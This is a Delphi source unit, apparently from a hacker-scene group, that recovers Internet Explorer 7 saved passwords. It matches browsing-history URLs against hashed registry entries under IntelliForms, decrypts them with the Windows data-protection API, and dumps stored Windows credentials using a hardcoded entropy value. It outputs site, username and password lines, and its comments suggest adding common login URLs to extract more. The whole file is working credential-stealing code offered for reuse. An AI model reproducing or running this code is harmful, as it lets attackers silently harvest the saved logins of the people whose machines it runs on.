unit uIE7_decode;
{______  __                 _____
___  / / /_____ _______ _____  /______ _____________ 
__  /_/ /_  __ `/_  __ `__ \  __/  __ `/_  ___/  __ \
_  __  / / /_/ /_  / / / / / /_ / /_/ /_  /   / /_/ /
/_/ /_/  \__,_/ /_/ /_/ /_/\__/ \__,_/ /_/    \____/ 
                                                     
				aka
	_________            ___    __      __________
	__  ____/______________ |  / /___  ____  ____/
	_  /    _  __ \_  ___/_ | / /_  / / /_____ \  
	/ /___  / /_/ /  /   __ |/ / / /_/ / ____/ /  
	\____/  \____//_/    _____/  \__,_/ /_____/   
					presents:   uIE7_decode

    - Decrypt the Passwords saved by the IE 7.
 -Don't make yourself a ripper, if you use this code, give credits-

Alle Anerkennung gebührt sapporoworks (http://www.sapporoworks.ne.jp) für
ihre geniale Beschreibung der IE 7 Passwortverschlüsselung.

greetz & thanks to: Arno Nühm of hackerboard, f0gx, bizzit, ReED and all members
                    of SoH, F-H, opensc and HY.
-> There must be 50 ways to learn to hover!
}
interface
  uses windows,
  CryptApi,
  uURLHistory,
  wcrypt2;

Var
  FullString: string;
  LastSite: string;


function ShowIEAutoCompletePWs   : String;
function ShowIEWebCert           : String;
function ShowIEAutoCompletePlain : String;

implementation

function Format(sFormat: String; Args: Array of const): String;
var
  i: Integer;
  pArgs1, pArgs2: PDWORD;
  lpBuffer: PChar;
begin
  pArgs1 := nil;
  if Length(Args) > 0 then
    GetMem(pArgs1, Length(Args) * sizeof(Pointer));
  pArgs2 := pArgs1;
  for i := 0 to High(Args) do
  begin
    pArgs2^ := DWORD(PDWORD(@Args[i])^);
    inc(pArgs2);
  end;
  GetMem(lpBuffer, 1024);
  try
    SetString(Result, lpBuffer, wvsprintf(lpBuffer, PChar(sFormat), PChar(pArgs1)));
  except
    Result := '';
  end;
  if pArgs1 <> nil then
    FreeMem(pArgs1);
  if lpBuffer <> nil then
    FreeMem(lpBuffer);
end;

procedure GetHashStr(password : PWideChar; var hashstr : String);
var
  hProv : HCRYPTPROV;
  hHash : HCRYPTHASH;
  buffer : array of byte;
  dwhashlen : DWord;
  i : Integer;
  tail : Byte;
begin
  tail := 0;
  hashstr := '';
  CryptAcquireContext(@hProv,0,0,PROV_RSA_FULL,0);
  if CryptCreatehash(hProv, CALG_SHA1, 0, 0,@hHash) Then begin
    if CryptHashData(hHash,@password[0], (Length(password) + 1) * SizeOf(WideChar),0) Then begin
      dwHashLen := 20;
      SetLength(buffer,20);
      If CryptGetHashParam(hHash,HP_HASHVAL,@Buffer[0],@dwHashLen,0) Then begin
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        For i := 0 To dwHashLen - 1 Do begin
          tail := tail + buffer[i];
          hashstr := hashstr + Format('%2.2X', [buffer[i]]);
        end;
        hashstr := hashstr + Format('%2.2X', [tail]);
      end;
    end;
  end;
end;


function IntToStr(I: integer): string;
begin
  Str(I, Result);
end;

function DecodeData(const buf: Pointer; BufLen: Dword): String;
var
  headersize : DWord;
  Datasize   : DWord;
  MaxData    : DWord;
  offset     : DWord;
  datalength : DWord;
  pInfo      : Pointer;
  PData      : Pointer;
  i          : Integer;
  strTemp    : Pwidechar;
  s: string;
begin
  result := '';
  CopyMemory(@headersize,Pointer(Cardinal(buf) +  4),4);
  CopyMemory(@Datasize,  Pointer(Cardinal(buf) +  8),4);
  CopyMemory(@MaxData,   Pointer(Cardinal(buf) + 20),4);
  Pinfo := Pointer(Cardinal(buf) + 36);
  PData := Pointer(Cardinal(buf) + headersize);
  for i := 0 To (MaxData -1) Do begin
    CopyMemory(@offset,pInfo,4);
    CopyMemory(@dataLength,Pointer(cardinal(pInfo) + 12),4);
    GetMem(strTemp,dataLength);
    strTemp := Pointer(Cardinal(buf) + HeaderSize+12+offset);

    s := Copy(FullString,Length(FullString)-1,2);

    if (s <> #13#10) and (FullString <> '') then begin
      FullString := FullString + String(strTemp) + #13#10;
    end else begin
      FullString := FullString + LastSite + '|' + String(strTemp)+ '|';
    end;

    PInfo := Pointer(Cardinal(PInfo) + 16);
  end;
end;

function DecryptFromRegistry(ToCheck : tastring; Path : pansichar)    : String;
var
  History : tastring;
  i : Integer;
  m : Integer;
  HashStr : String;
  Key   : HKey;
  name  : PAnsiChar;
  namelength : cardinal;
  dwType : DWord;
  dwSize     : Dword;
  buffer : array of byte;
  DataIn : DATA_BLOB;
  DataOut: DATA_BLOB;
  OptionalEntropy : DATA_BLOB;
begin
  m := 0;
  if RegOpenKeyEx(HKEY_CURRENT_USER,path,0,KEY_QUERY_VALUE, Key) = ERROR_SUCCESS Then begin
    namelength := 1024;
    GetMem(name,nameLength);
    While (RegEnumValue(Key,m,name,namelength,nil,nil,nil,nil) <> ERROR_NO_MORE_ITEMS) Do begin
      namelength := 1024;
      For i := 0 To  High(ToCheck) Do begin
        GetHashStr(ToCheck[i],HashStr);
        if (lstrcmp(Pchar(Hashstr),name) = 0) Then begin

          LastSite := String(ToCheck[i]);

          //result := result + 'URL/FORM: '  + String(ToCheck[i]) + #13#10;
          //result := result + 'Hash    : ' + HashStr + #13#10;

          RegQueryValueEx(Key, name,nil,@dwType,nil,@dwSize);
          SetLength(buffer,dwSize);
          if RegQueryValueEx(Key, name,nil,@dwType,@buffer[0],@dwSize) = ERROR_SUCCESS Then begin
            DataIn.pbData := @buffer[0];
            DataIn.cbData := dwSize;
            OptionalEntropy.pbData := @ToCheck[i][0];
            OptionalEntropy.cbData := (Length(ToCheck[i]) + 1) * SizeOf(WideChar);
            if CryptUnprotectData(@DataIn,0,@OptionalEntropy,nil,nil,1,@DataOut) Then begin
              //result := result + DecodeData(DataOut.pbData, DataOut.cbData)  + '-------------------------------------' + #13#10;
              //FullString := FullString + LastSite + '|' +
              DecodeData(DataOut.pbData, DataOut.cbData);
            end;
          end;
        end;
      end;
      Zeromemory(name,namelength);
      inc(m);    
    end;
    
  end;
  RegCloseKey(Key);
end;

function ShowIEWebCert      : String;
var
  Credential : PCREDENTIAL;
  Count : DWord;
  DataIn : DATA_BLOB;
  DataOut : DATA_BLOB;
  OptionalEntropy : DATA_BLOB;
  tmp : array[0..36] of SmallInt;
  password : array[0..36] of char;
  i : integer;
  plain : PWidechar;
begin
  result := '';
  password :=  'abe2869f-9b47-4cd9-a358-c22904dba7f7';
  for i :=0 To 36 Do  begin
    tmp[i] := (Ord(password[i]) * 4);
  end;
  OptionalEntropy.pbData := @tmp;
  OptionalEntropy.cbData := 74;
  CredEnumerate(nil, 0, count, Credential);
  for i:= 0 to count -1 do begin
    DataIn.pbData := Credential[i].CredentialBlob;
    DataIn.cbData := Credential[i].CredentialBlobSize;
    CryptUnprotectData(@DataIn, nil, @OptionalEntropy, nil, nil, 0, @DataOut);
    GetMem(plain,Dataout.cbData);
    plain := Pwchar(DataOut.pbData);
    result := result + Credential[i].TargetName + '|';
    result := result + Copy(plain, 0, Pos(':',plain) - 1) + '|';
    result := result + Copy(plain,Pos(':',plain) + 1,Length(plain) - Pos(':',plain)) + #13#10;
  end;
end;

function ShowIEAutoCompletePWs      : String;
var
  History : tastring;
begin
  FullString := '';
  EnumIEHistory(History);
  //hier kann man durch das Hinzufügen von typischen Passwort-URLs, wie
  //https://ssl.rapidshare.com/cgi-bin/premiumzone.cgi/
  //auch Passwörter versuchen zu entschlüssseln,
  //die nicht in der History gespeichert sind.
  DecryptFromRegistry(history,'Software\Microsoft\Internet Explorer\IntelliForms\Storage2');
  result := FullString;
end;

function ShowIEAutoCompletePlain : String;
var
  FormNames : tastring;
begin
  SetLength(FormNames,2);
  FormNames[0] := 'username';          //google Suche
  FormNames[1] := 'q';  //vBulletin login - wie wärs mit noch mehr?
  result := DecryptFromRegistry(FormNames,'Software\Microsoft\Internet Explorer\IntelliForms\Storage1');
end;

end.
